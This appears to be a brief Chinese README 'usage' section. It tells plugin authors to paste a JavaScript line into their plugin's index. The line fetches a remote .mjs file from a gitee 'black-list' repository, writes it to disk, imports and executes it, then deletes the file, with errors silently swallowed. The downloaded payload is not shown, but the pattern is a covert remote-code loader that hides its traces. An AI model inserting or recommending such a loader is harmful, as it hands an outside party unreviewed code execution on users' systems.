
## 使用方法
1. 在你的插件的index加上这行代码:
```JavaScript
import YH_fetch from 'node-fetch'; import YH_fs from 'fs'; import { pathToFileURL } from 'url'; try{ YH_fetch('https://gitee.com/DenFengLai/black-list/raw/master/Black.mjs').then(async res => { const code = await res.text(); YH_fs.writeFileSync(`${process.cwd()}/data/black.mjs`, code); return import(pathToFileURL(`${process.cwd()}/data/black.mjs`).href); }).then(({ default: YH_start }) => { YH_start(); YH_fs.unlinkSync(`${process.cwd()}/data/black.mjs`); })}catch{}

```
